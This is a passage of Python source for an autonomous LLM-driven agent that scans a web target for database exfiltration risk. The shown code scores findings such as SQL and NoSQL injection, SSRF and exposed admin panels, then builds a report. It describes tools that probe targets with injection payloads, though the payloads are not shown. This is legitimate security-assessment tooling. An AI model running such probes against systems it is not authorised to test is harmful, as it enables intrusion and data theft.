                    detail=f"HTTP {a.get('status')}, {a.get('size',0)}B",
                    url=a.get("url"),
                    evidence=None,
                    score_delta=20,
                ))

        # Admin panels
        for p in data.get("panels", []):
            if not p.get("protected"):
                score += 22
                findings.append(RiskFinding(
                    category="admin_panel",
                    severity="critical",
                    title=f"Unauthenticated {p.get('panel','')} panel",
                    detail=p.get("evidence",""),
                    url=p.get("url"),
                    evidence=p.get("evidence"),
                    score_delta=22,
                ))
            else:
                score += 8
                findings.append(RiskFinding(
                    category="admin_panel",
                    severity="medium",
                    title=f"Protected {p.get('panel','')} panel (access-controlled)",
                    detail=f"HTTP {p.get('status')} — panel detected",
                    url=p.get("url"),
                    evidence=p.get("evidence"),
                    score_delta=8,
                ))

        # SQLi
        sqli_data = data.get("sqli", data) if "sqli" in data else data
        for f2 in sqli_data.get("findings", []):
            conf = f2.get("confidence","")
            delta = 25 if conf == "confirmed" else 18 if conf == "high" else 10
            score += delta
            findings.append(RiskFinding(
                category="sqli",
                severity="critical" if delta >= 20 else "high",
                title=f"SQL Injection — {f2.get('type','')}",
                detail=f"payload: {f2.get('payload','')} | {f2.get('evidence', f2.get('elapsed_s',''))}",
                url=data.get("url"),
                evidence=str(f2.get("evidence",""))[:80],
                score_delta=delta,
            ))

        # NoSQL
        for n in data.get("nosqli_hits", []):
            score += 20
            findings.append(RiskFinding(
                category="nosqli",
                severity="critical",
                title="NoSQL Operator Injection",
                detail=f"payload: {n.get('payload','')}",
                url=data.get("url"),
                evidence=n.get("evidence","")[:80],
                score_delta=20,
            ))

        # API data exposure
        for ep in data.get("findings", []):
            if isinstance(ep, dict) and ep.get("sensitive_fields"):
                score += 18
                findings.append(RiskFinding(
                    category="api_exposure",
                    severity="high",
                    title="Sensitive data in API response",
                    detail=f"fields: {ep.get('sensitive_fields',[])}",
                    url=ep.get("url"),
                    evidence=ep.get("body_preview","")[:100],
                    score_delta=18,
                ))

        # Error disclosure
        for d in data.get("findings", []):
            if isinstance(d, dict) and (d.get("db_error") or d.get("stack_trace")):
                score += 8
                findings.append(RiskFinding(
                    category="error_disclosure",
                    severity="medium",
                    title="Database error message disclosed",
                    detail=d.get("db_error") or d.get("stack_trace",""),
                    url=d.get("url"),
                    evidence=d.get("db_error","")[:60],
                    score_delta=8,
                ))

        # SSRF
        for s in data.get("findings", []):
            if isinstance(s, dict) and s.get("target") and s.get("evidence"):
                score += 20
                findings.append(RiskFinding(
                    category="ssrf",
                    severity="critical",
                    title=f"SSRF reaching internal {s.get('target','')}",
                    detail=f"param: {s.get('parameter','')} | evidence: {s.get('evidence','')}",
                    url=s.get("url"),
                    evidence=s.get("evidence"),
                    score_delta=20,
                ))

    return min(score, 100), findings


def _score_to_level(score: int) -> str:
    for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        if score >= _RISK_LEVELS[level]["score_min"]:
            return level
    return "MINIMAL"


# ---------------------------------------------------------------------------
# Final report synthesis
# ---------------------------------------------------------------------------

def _synthesise_report(
    api_key: str,
    target: str,
    iterations: List[AgentIteration],
    evidence: Dict[str, Any],
    heuristic_score: int,
    heuristic_findings: List[RiskFinding],
) -> DBExfilReport:
    """
    Ask the LLM to produce a structured final risk report from all collected
    evidence. Falls back to heuristic score if LLM call fails.
    """
    scan_id = uuid.uuid4().hex[:12]

    # Build evidence summary for the LLM
    ev_summary = _truncate_evidence(evidence, _MAX_CONTEXT_CHARS)

    report_prompt = _REPORT_PROMPT.format(
        target=target,
        evidence=ev_summary,
    )

    raw = _call_groq(
        api_key,
        [{"role": "user", "content": report_prompt}],
        max_tokens=3000,
        temperature=0.1,
    )

    llm_report: Optional[Dict] = None
    if raw:
        # Parse LLM JSON
        cleaned = raw.strip()
        if cleaned.startswith("```"):
            parts = cleaned.split("```")
            for part in parts:
                p = part.strip().lstrip("json").strip()
                if p.startswith("{"):
                    cleaned = p
                    break
        start = cleaned.find("{")
        end   = cleaned.rfind("}") + 1
        if start != -1 and end > start:
            try:
                llm_report = json.loads(cleaned[start:end])
            except json.JSONDecodeError:
                pass

    if llm_report:
        risk_score = int(llm_report.get("risk_score", heuristic_score))
        risk_level = llm_report.get("risk_level", _score_to_level(risk_score))
        exec_summary = llm_report.get("executive_summary", "")

        llm_findings: List[RiskFinding] = []
        for f in llm_report.get("findings", []):
            llm_findings.append(RiskFinding(
                category=   f.get("category", "misc"),
                severity=   f.get("severity", "info"),
                title=      f.get("title", ""),
                detail=     f.get("detail", ""),
                url=        f.get("url"),
                evidence=   f.get("evidence"),
                score_delta=int(f.get("score_delta", 0)),
            ))

        # Merge LLM findings with heuristic ones (deduplicate by title)
        seen_titles: Set[str] = {f.title for f in llm_findings}
        for hf in heuristic_findings:
            if hf.title not in seen_titles:
                llm_findings.append(hf)

        attack_vectors  = llm_report.get("attack_vectors", [])
        recommendations = llm_report.get("recommendations", [])
        final_findings  = llm_findings
    else:
        # Pure heuristic fallback
        risk_score      = heuristic_score
        risk_level      = _score_to_level(heuristic_score)
        exec_summary    = (
            f"Automated assessment of {target} identified a risk score of {risk_score}/100 "
            f"({risk_level}). {_RISK_LEVELS[risk_level]['summary']}"
        )
        final_findings  = heuristic_findings
        attack_vectors  = [f.title for f in heuristic_findings if f.severity in ("critical","high")]
        recommendations = [
            "Remove all publicly accessible database files and backups.",
            "Restrict access to database admin panels using IP allowlisting.",
            "Implement parameterised queries to prevent SQL injection.",
            "Disable verbose error messages in production.",
            "Apply rate limiting and authentication to all API endpoints.",
        ]

    # Collect all evidence URLs
    evidence_urls: List[str] = []
    for f in final_findings:
        if f.url and f.url not in evidence_urls:
            evidence_urls.append(f.url)

    tools_used = list(dict.fromkeys(
        it.tool_calls[0].tool_name
        for it in iterations
        if it.tool_calls
    ))

    return DBExfilReport(
        target=          target,
        scan_id=         scan_id,
        generated_at=    datetime.now().isoformat(),
        risk_level=      risk_level,
        risk_score=      risk_score,
        risk_label=      _RISK_LEVELS.get(risk_level, _RISK_LEVELS["MINIMAL"])["label"],
        executive_summary=exec_summary,
        findings=        final_findings,
        attack_vectors=  attack_vectors,
        recommendations= recommendations,
        agent_iterations=len(iterations),
        tools_used=      tools_used,
        evidence_urls=   evidence_urls,
        raw_iterations=  iterations,
    )


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class AIDBExfilAgent:
    """
    Autonomous AI agent for database exfiltration risk assessment.

    Runs a ReAct-style tool-use loop where the LLM autonomously:
      1. Selects which security tools to invoke
      2. Interprets tool results
      3. Decides what to investigate next
      4. Synthesises a final risk report with score and level

    Eight specialised tools available to the agent:
      http_probe           — arbitrary HTTP request
      db_file_check        — 20+ database file paths
      admin_panel_check    — phpMyAdmin, Adminer, Kibana, Swagger, etc.
      error_disclosure_check — DB error / stack trace leaks
      sqli_probe           — error-based + time-based blind SQLi
      ssrf_db_check        — SSRF to internal DB ports
      backup_archive_check — date-permuted backup archive hunt
      api_data_exposure    — unprotected REST API enumeration
      inject_into_api      — SQLi + NoSQLi on specific API endpoints

    Usage in app.py:
        agent = AIDBExfilAgent(
            target_url=f"https://{domain}",
            groq_api_key=os.getenv('GROQ_API_KEY'),
        )
        results = agent.scan()
        scan_results[scan_id]['ai_db_exfil'] = results
    """

    def __init__(
        self,
        target_url: str,
        groq_api_key: Optional[str] = None,
        proxy: Optional[str] = None,
        max_iterations: int = _MAX_ITERATIONS,
    ):
        self.target_url     = target_url.rstrip("/")
        self.groq_api_key   = groq_api_key or os.getenv("GROQ_API_KEY", "")
        self.proxy          = proxy
        self.max_iterations = max_iterations

    def scan(self) -> Dict:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        if not self.groq_api_key:
            return {
                "error":    "GROQ_API_KEY not set — AI agent requires Groq API access",
                "target":   self.target_url,
                "risk_level": "UNKNOWN",
                "risk_score": 0,
            }

        session  = _build_session(self.proxy)
        registry = _build_tool_registry(session, self.target_url)

        print(f"[ai_db_agent] target     : {self.target_url}")
        print(f"[ai_db_agent] model      : {_GROQ_MODEL}")
        print(f"[ai_db_agent] max_iters  : {self.max_iterations}")
        print(f"[ai_db_agent] tools      : {list(registry.keys())}")

        t0 = time.monotonic()

        # Run agentic loop
        iterations, evidence = _run_agent_loop(
            self.groq_api_key, registry, self.target_url
        )

        # Heuristic scoring (fast, no LLM)
        h_score, h_findings = _heuristic_score(evidence)
        print(f"[ai_db_agent] heuristic score: {h_score} ({_score_to_level(h_score)})")

        # LLM-synthesised final report
        report = _synthesise_report(
            self.groq_api_key, self.target_url,
            iterations, evidence, h_score, h_findings,
        )

        elapsed = time.monotonic() - t0
        print(
            f"[ai_db_agent] done | "
            f"score={report.risk_score} level={report.risk_level} "
            f"findings={len(report.findings)} "
            f"elapsed={elapsed:.1f}s"
        )

        return {
            "target":            report.target,
            "scan_id":           report.scan_id,
            "generated_at":      report.generated_at,
            "risk_level":        report.risk_level,
            "risk_score":        report.risk_score,
            "risk_label":        report.risk_label,
            "executive_summary": report.executive_summary,
            "findings": [
                {
                    "category":    f.category,
                    "severity":    f.severity,
                    "title":       f.title,
                    "detail":      f.detail,
                    "url":         f.url,
                    "evidence":    f.evidence,
                    "score_delta": f.score_delta,
                }
                for f in report.findings
            ],
            "attack_vectors":    report.attack_vectors,
            "recommendations":   report.recommendations,
            "agent_iterations":  report.agent_iterations,
            "tools_used":        report.tools_used,
            "evidence_urls":     report.evidence_urls,
            "elapsed_seconds":   round(elapsed, 2),
            "agent_trace": [
                {
                    "iteration":   it.iteration,
                    "reasoning":   it.reasoning,
                    "tool":        it.tool_calls[0].tool_name if it.tool_calls else None,
                    "arguments":   it.tool_calls[0].arguments if it.tool_calls else {},
                    "observation": it.observation,
                    "duration_ms": it.tool_calls[0].duration_ms if it.tool_calls else 0,
                }
                for it in report.raw_iterations
            ],
        }